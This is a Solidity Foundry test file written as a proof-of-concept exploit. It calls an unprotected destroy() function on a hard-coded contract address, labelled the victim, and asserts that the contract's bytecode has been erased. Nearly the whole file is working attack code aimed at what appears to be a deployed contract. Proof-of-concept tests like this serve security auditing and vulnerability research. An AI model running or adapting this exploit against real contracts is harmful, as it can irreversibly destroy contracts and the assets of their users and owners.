pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface SmartContract_Audit_Solidproof_Jizzjet {
    function destroy() external;
    function kill() external;
    function selfDestruct() external;
    function emergencyShutdown() external;
    function killContract() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);
    SmartContract_Audit_Solidproof_Jizzjet target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = SmartContract_Audit_Solidproof_Jizzjet(TARGET);
        vm.label(TARGET, "Victim Contract");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Call the unprotected selfdestruct function
        // Try common function names for contract destruction
        (bool success, ) = TARGET.call(abi.encodeWithSignature("destroy()"));
        require(success, "destroy() call failed");

        // Verify the contract has been destroyed
        assertEq(address(TARGET).code.length, 0, "Contract was not destroyed");
        assertEq(address(target).code.length, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

